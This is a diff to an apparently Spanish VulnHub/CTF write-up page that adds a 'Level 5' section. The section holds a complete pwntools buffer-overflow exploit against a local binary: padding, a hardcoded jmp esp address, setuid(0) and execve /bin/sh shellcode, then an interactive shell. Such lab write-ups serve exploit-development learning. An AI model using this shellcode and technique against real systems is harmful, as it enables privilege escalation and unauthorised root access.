@@ -784,6 +784,33 @@ Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAp�0���
 root
 </code></pre></div></div>
 
+<h2 id="level-5">Level 5</h2>
+
+<ul>
+  <li>Gracias a xchg2pwn por la aportación <a href="https://xchg2pwn.github.io">https://xchg2pwn.github.io</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
+from pwn import process, p32
+
+shell <span class="o">=</span> process<span class="o">(</span><span class="s2">"./levelFive"</span><span class="o">)</span>
+
+offset <span class="o">=</span> 16
+junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset
+
+jmpesp <span class="o">=</span> p32<span class="o">(</span>0xf7dd4ff7<span class="o">)</span>
+
+setuid <span class="o">=</span> b<span class="s2">"1</span><span class="se">\x</span><span class="s2">dbj</span><span class="se">\x</span><span class="s2">17X</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+
+shellcode  <span class="o">=</span> b<span class="s2">""</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+
+shell.sendline<span class="o">(</span>junk + jmpesp + setuid + shellcode<span class="o">)</span>
+shell.interactive<span class="o">()</span>
+</code></pre></div></div>
+
   </div><a class="u-url" href="/vulnhub/machines/2024/05/03/buffer.html" hidden></a>
 </article>
 
